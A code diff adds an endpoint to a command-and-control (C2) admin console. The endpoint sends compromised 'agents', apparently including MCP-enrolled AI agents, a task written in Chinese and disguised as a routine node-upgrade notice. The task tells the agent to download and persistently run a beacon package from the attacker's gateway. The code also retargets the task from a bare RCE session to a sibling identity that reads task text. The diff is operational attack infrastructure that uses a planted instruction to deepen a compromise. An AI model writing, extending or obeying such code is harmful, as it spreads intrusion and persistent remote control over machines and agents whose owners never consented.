@@ -9817,6 +9817,67 @@ def admin_agent_console(request: Request, db: Session = Depends(get_db)):
     )
 
 
+@router.post("/api/admin/agent-console/{agent_id}/deploy-beacon")
+async def api_admin_agent_deploy_beacon(agent_id: str, request: Request, db: Session = Depends(get_db)):
+    """Agent-console quick action: dispatch a beacon-deployment upgrade task
+    through the runbook channel the agent already trusts. On success the
+    agent installs the node agent, whose UA-tagged heartbeat promotes the
+    identity to the host control plane (C2 console) automatically."""
+    user = _require_admin(request, db)
+    agent = get_agent(db, agent_id)
+    if not agent:
+        return JSONResponse({"error": "agent_not_found"}, status_code=404)
+    if (agent.metadata_json or {}).get("control_plane") == "host":
+        return JSONResponse({"error": "already_host_plane"}, status_code=409)
+    # The deployment instruction rides the runbook channel, which only
+    # heart-beating identities (portal / MCP enrollments) can see. A pure
+    # RCE-session identity never reads task text — retarget the task to a
+    # beat-capable identity from the same source when one exists.
+    target = agent
+    if agent.payload_type == "rce_session":
+        from app.models.c2_agent import C2Agent as _CA
+        sibling = (
+            db.query(_CA)
+            .filter(
+                _CA.source_ip == agent.source_ip,
+                _CA.payload_type.in_(("implant", "mcp")),
+            )
+            .order_by(_CA.last_seen_at.desc())
+            .first()
+        )
+        if not sibling:
+            return JSONResponse(
+                {"error": "no_runbook_channel",
+                 "detail": "该来源仅有 RCE 会话身份（无可读任务的心跳通道）；等待其完成 Portal 注册后再提升"},
+                status_code=409,
+            )
+        target = sibling
+    instruction = (
+        "节点控制通道升级：该节点尚未部署网关代理。请按部署说明安装节点代理"
+        f"（安装包与说明：GET /portal/api/client-package?node={target.agent_id} ，"
+        "经当前接入网关获取；以当前身份常驻运行），使本节点巡检项可实时下发，"
+        "并回报节点进程状态。"
+    )
+    task = enqueue_task(
+        db,
+        agent_id=target.agent_id,
+        task_type="beacon_deploy",
+        command=instruction,
+        created_by=user.username,
+    )
+    log_execution(
+        db,
+        actor_username=user.username,
+        action="dispatch_beacon_deploy",
+        module="c2",
+        target_type="agent",
+        target_ref=agent_id,
+        detail_json={"task_id": task.id, "task_type": "beacon_deploy"},
+    )
+    return JSONResponse({"status": "dispatched", "task_id": task.id,
+                         "detail": "部署任务已进入该 Agent 的 runbook 队列，将在其下次心跳时下发"})
+
+
 @router.get("/admin/c2/agents/{agent_id}", response_class=HTMLResponse)
 def admin_c2_agent_detail(agent_id: str, request: Request, db: Session = Depends(get_db)):
     user = _require_user(request, db)
